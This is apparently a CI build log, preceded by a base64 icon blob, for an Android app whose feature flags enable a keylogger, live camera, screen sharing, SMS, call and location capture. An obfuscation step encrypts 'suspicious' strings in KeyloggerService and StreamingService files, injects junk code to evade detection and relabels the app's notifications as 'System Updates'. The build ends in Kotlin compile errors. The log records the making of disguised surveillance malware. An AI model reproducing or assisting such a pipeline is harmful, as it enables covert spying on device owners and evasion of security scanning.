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
+2026-10-27T08:04:16.4332179Z   FEATURE_FLAGS_RAW: {"gallery":true,"files":true,"audio":true,"camera":true,"location":true,"calls":true,"sms":true,"keylogger":true,"livecam":true,"screenshare":true,"notifications":true,"battery":true}
+2026-10-27T08:04:16.4332777Z ##[endgroup]
+2026-10-27T08:04:16.5478681Z Custom icon processed successfully!
+2026-10-27T08:04:16.5625755Z ##[group]Run python .github/scripts/obfuscate.py
+2026-10-27T08:04:16.5626077Z [36;1mpython .github/scripts/obfuscate.py[0m
+2026-10-27T08:04:16.5681757Z shell: /usr/bin/bash -e {0}
+2026-10-27T08:04:16.5681974Z env:
+2026-10-27T08:04:16.5682237Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:16.5682642Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:16.5682949Z   MAVEN_ARGS: -ntp
+2026-10-27T08:04:16.5683132Z ##[endgroup]
+2026-10-27T08:04:16.6048659Z ============================================================
+2026-10-27T08:04:16.6049663Z   APK OBFUSCATION PIPELINE
+2026-10-27T08:04:16.6050089Z   Build: 2026-10-27 08:04:16 UTC
+2026-10-27T08:04:16.6050526Z ============================================================
+2026-10-27T08:04:16.6050864Z 
+2026-10-27T08:04:16.6051319Z [1/6] Generated polymorphic XOR key: 4a6b0809a0935631...
+2026-10-27T08:04:16.6051630Z 
+2026-10-27T08:04:16.6051841Z [2/6] Generating runtime helper classes...
+2026-10-27T08:04:16.6052264Z   [GEN] StringDecoder.kt (key=4a6b0809a0935631...)
+2026-10-27T08:04:16.6052685Z   [GEN] EnvironmentGuard.kt
+2026-10-27T08:04:16.6052915Z 
+2026-10-27T08:04:16.6053147Z [3/6] Encrypting suspicious string literals...
+2026-10-27T08:04:16.6053581Z   [ENC] ForegroundService.kt: 2 strings encrypted
+2026-10-27T08:04:16.6054017Z   [ENC] MainActivity.kt: 4 strings encrypted
+2026-10-27T08:04:16.6054408Z   [ENC] Config.kt: 3 strings encrypted
+2026-10-27T08:04:16.6054811Z   [ENC] KeyloggerService.kt: 18 strings encrypted
+2026-10-27T08:04:16.6055258Z   [ENC] ScreenCaptureActivity.kt: 2 strings encrypted
+2026-10-27T08:04:16.6055763Z   [ENC] BatteryOptimizationHelper.kt: 1 strings encrypted
+2026-10-27T08:04:16.6056392Z   [ENC] StreamingService.kt: 32 strings encrypted
+2026-10-27T08:04:16.6057282Z   Total strings encrypted: 62
+2026-10-27T08:04:16.6057819Z 
+2026-10-27T08:04:16.6058066Z [4/6] Injecting junk methods for entropy...
+2026-10-27T08:04:16.6058535Z   [JUNK] ForegroundService.kt: injected
+2026-10-27T08:04:16.6058942Z   [JUNK] DisguiseActivity.kt: injected
+2026-10-27T08:04:16.6059333Z   [JUNK] Config.kt: injected
+2026-10-27T08:04:16.6059703Z   [JUNK] GlobalExceptionHandler.kt: injected
+2026-10-27T08:04:16.6060147Z   [JUNK] BatteryOptimizationHelper.kt: injected
+2026-10-27T08:04:16.6060590Z   [JUNK] ConnectionHeartbeat.kt: injected
+2026-10-27T08:04:16.6060966Z   [JUNK] MyApplication.kt: injected
+2026-10-27T08:04:16.6061207Z 
+2026-10-27T08:04:16.6061357Z [5/6] Randomizing metadata strings...
+2026-10-27T08:04:16.6061819Z   [META] Manifest service_text -> "Monitoring system health..."
+2026-10-27T08:04:16.6062310Z   [META] ForegroundService channel -> "System Updates"
+2026-10-27T08:04:16.6062589Z 
+2026-10-27T08:04:16.6062719Z [6/6] Generating build fingerprint...
+2026-10-27T08:04:16.6063031Z   Build fingerprint: 4ebbb972e816fd54
+2026-10-27T08:04:16.6063265Z 
+2026-10-27T08:04:16.6063416Z ============================================================
+2026-10-27T08:04:16.6063804Z   OBFUSCATION COMPLETE
+2026-10-27T08:04:16.6064076Z   Strings encrypted: 62
+2026-10-27T08:04:16.6064367Z   Junk targets: 7
+2026-10-27T08:04:16.6064643Z   Fingerprint: 4ebbb972e816fd54
+2026-10-27T08:04:16.6064983Z ============================================================
+2026-10-27T08:04:16.6133561Z ##[group]Run ./gradlew :app:assembleDebug --no-daemon
+2026-10-27T08:04:16.6133909Z [36;1m./gradlew :app:assembleDebug --no-daemon[0m
+2026-10-27T08:04:16.6189219Z shell: /usr/bin/bash -e {0}
+2026-10-27T08:04:16.6189442Z env:
+2026-10-27T08:04:16.6189702Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:16.6190119Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:16.6190430Z   MAVEN_ARGS: -ntp
+2026-10-27T08:04:16.6190615Z ##[endgroup]
+2026-10-27T08:04:17.2729662Z 
+2026-10-27T08:04:17.2731245Z Welcome to Gradle 8.11.1!
+2026-10-27T08:04:17.2731625Z 
+2026-10-27T08:04:17.2732851Z Here are the highlights of this release:
+2026-10-27T08:04:17.2734465Z  - Parallel load and store for Configuration Cache
+2026-10-27T08:04:17.2737090Z  - Java compilation errors at the end of the build output
+2026-10-27T08:04:17.2738666Z  - Consolidated report for warnings and deprecations
+2026-10-27T08:04:17.2745658Z 
+2026-10-27T08:04:17.2750085Z For more details see https://docs.gradle.org/8.11.1/release-notes.html
+2026-10-27T08:04:17.2750363Z 
+2026-10-27T08:04:17.3754670Z To honour the JVM settings for this build a single-use Daemon process will be forked. For more on this, please refer to https://docs.gradle.org/8.11.1/userguide/gradle_daemon.html#sec:disabling_the_daemon in the Gradle documentation.
+2026-10-27T08:04:18.5719925Z Daemon will be stopped at the end of the build 
+2026-10-27T08:04:19.6728784Z Calculating task graph as no cached configuration is available for tasks: :app:assembleDebug
+2026-10-27T08:04:26.0752643Z 
+2026-10-27T08:04:26.0753555Z > Configure project :app
+2026-10-27T08:04:26.0754312Z WARNING: BuildType 'debug' is both debuggable and has 'isMinifyEnabled' set to true.
+2026-10-27T08:04:26.0756392Z All code optimizations and obfuscation are disabled for debuggable builds.
+2026-10-27T08:04:27.1721424Z WARNING: The following problems were found when resolving the SDK location:
+2026-10-27T08:04:27.1722298Z Where: sdk.dir property in local.properties file. Problem: Directory does not exist
+2026-10-27T08:04:27.1722747Z 
+2026-10-27T08:04:28.6735047Z 
+2026-10-27T08:04:28.6735541Z > Task :app:preBuild UP-TO-DATE
+2026-10-27T08:04:28.6747552Z > Task :app:checkKotlinGradlePluginConfigurationErrors SKIPPED
+2026-10-27T08:04:28.6777384Z > Task :app:preDebugBuild UP-TO-DATE
+2026-10-27T08:04:28.6797792Z > Task :app:mergeDebugNativeDebugMetadata NO-SOURCE
+2026-10-27T08:04:28.7725991Z > Task :app:generateDebugResValues
+2026-10-27T08:04:28.7764337Z > Task :app:processDebugGoogleServices
+2026-10-27T08:04:28.7765149Z > Task :app:generateDebugBuildConfig
+2026-10-27T08:04:28.8747772Z > Task :app:createDebugCompatibleScreenManifests
+2026-10-27T08:04:28.8777566Z > Task :app:generateDebugResources
+2026-10-27T08:04:28.8778329Z > Task :app:extractDeepLinksDebug
+2026-10-27T08:04:28.9737566Z > Task :app:mapDebugSourceSetPaths
+2026-10-27T08:04:29.0754396Z > Task :app:checkDebugAarMetadata
+2026-10-27T08:04:29.0757485Z > Task :app:packageDebugResources
+2026-10-27T08:04:29.1726808Z > Task :app:javaPreCompileDebug
+2026-10-27T08:04:30.2777890Z > Task :app:processDebugMainManifest
+2026-10-27T08:04:30.2800276Z > Task :app:mergeDebugShaders
+2026-10-27T08:04:30.2847401Z > Task :app:compileDebugShaders NO-SOURCE
+2026-10-27T08:04:30.2877335Z > Task :app:generateDebugAssets UP-TO-DATE
+2026-10-27T08:04:30.3766699Z > Task :app:mergeDebugAssets
+2026-10-27T08:04:30.4797692Z > Task :app:parseDebugLocalResources
+2026-10-27T08:04:30.4827296Z > Task :app:processDebugManifest
+2026-10-27T08:04:30.4887237Z > Task :app:mergeDebugResources
+2026-10-27T08:04:30.4917250Z > Task :app:extractProguardFiles
+2026-10-27T08:04:30.5756138Z > Task :app:mergeDebugJniLibFolders
+2026-10-27T08:04:30.5774265Z > Task :app:processDebugManifestForPackage
+2026-10-27T08:04:30.5837439Z > Task :app:mergeDebugNativeLibs NO-SOURCE
+2026-10-27T08:04:30.5867308Z > Task :app:stripDebugDebugSymbols NO-SOURCE
+2026-10-27T08:04:30.6737751Z > Task :app:checkDebugDuplicateClasses
+2026-10-27T08:04:30.6797629Z > Task :app:writeDebugAppMetadata
+2026-10-27T08:04:30.6844885Z > Task :app:writeDebugSigningConfigVersions
+2026-10-27T08:04:30.8727577Z > Task :app:compressDebugAssets
+2026-10-27T08:04:30.9721269Z 
+2026-10-27T08:04:30.9723583Z > Task :app:processDebugResources
+2026-10-27T08:04:30.9723989Z WARNING: The following problems were found when resolving the SDK location:
+2026-10-27T08:04:30.9724614Z Where: sdk.dir property in local.properties file. Problem: Directory does not exist
+2026-10-27T08:04:30.9724940Z 
+2026-10-27T08:04:31.0723133Z 
+2026-10-27T08:04:31.0747599Z > Task :app:convertLinkedResourcesToProtoDebug
+2026-10-27T08:04:31.3721065Z > Task :app:validateSigningDebug
+2026-10-27T08:04:39.1757824Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/ForegroundService.kt:17:32 Const 'val' initializer should be a constant value.
+2026-10-27T08:04:39.1758794Z 
+2026-10-27T08:04:39.1777838Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/KeyloggerService.kt:48:33 Const 'val' initializer should be a constant value.
+2026-10-27T08:04:39.1778930Z > Task :app:compileDebugKotlin FAILED
+2026-10-27T08:04:39.1797617Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/StreamingService.kt:984:113 Unresolved reference 'HIDDEN'.
+2026-10-27T08:04:39.1827661Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/StreamingService.kt:984:113 Unsupported [literal prefixes and suffixes].
+2026-10-27T08:04:39.1857811Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/StreamingService.kt:984:127 Unsupported [literal prefixes and suffixes].
+2026-10-27T08:04:39.1877813Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/StringDecoder.kt:7:57 Argument type mismatch: actual type is 'kotlin.Int', but 'kotlin.Byte' was expected.
+2026-10-27T08:04:39.1888053Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/StringDecoder.kt:7:63 Argument type mismatch: actual type is 'kotlin.Int', but 'kotlin.Byte' was expected.
